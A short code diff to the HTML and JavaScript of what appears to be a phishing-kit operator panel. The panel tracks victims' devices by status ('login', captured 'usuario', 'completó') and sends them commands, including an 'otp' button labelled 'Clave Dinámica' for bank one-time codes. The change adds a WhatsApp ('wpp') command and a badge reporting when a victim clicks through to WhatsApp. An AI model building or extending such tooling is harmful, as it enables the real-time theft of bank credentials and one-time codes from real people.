@@ -841,7 +841,10 @@
                     let badgeClass = 'status-visitor';
                     let badgeText = statusText;
 
-                    if (statusText.includes('completó')) {
+                    if (statusText.includes('wpp') || statusText.includes('whatsapp') || dev.wppClicked) {
+                        badgeClass = 'status-complete';
+                        badgeText = '💬 CLIENTE DIO CLIC EN WPP';
+                    } else if (statusText.includes('completó')) {
                         badgeClass = 'status-complete';
                         badgeText = 'COMPLETADO';
                     } else if (statusText.includes('login') || usuario !== '---') {
@@ -914,6 +917,9 @@
                         <div class="actions-header">Acciones del Panel</div>
 
                         <div class="action-buttons-grid">
+                            <button class="btn-action btn-wpp" onclick="sendCommand('${token}', '${deviceId}', 'wpp')" style="background: linear-gradient(135deg, #25D366, #128C7E); color: #fff; font-weight: 700;">
+                                <i class="fa-brands fa-whatsapp"></i> wpp
+                            </button>
                             <button class="btn-action btn-otp" onclick="sendCommand('${token}', '${deviceId}', 'otp')">
                                 <i class="fa-solid fa-key"></i> Clave Dinámica
                             </button>
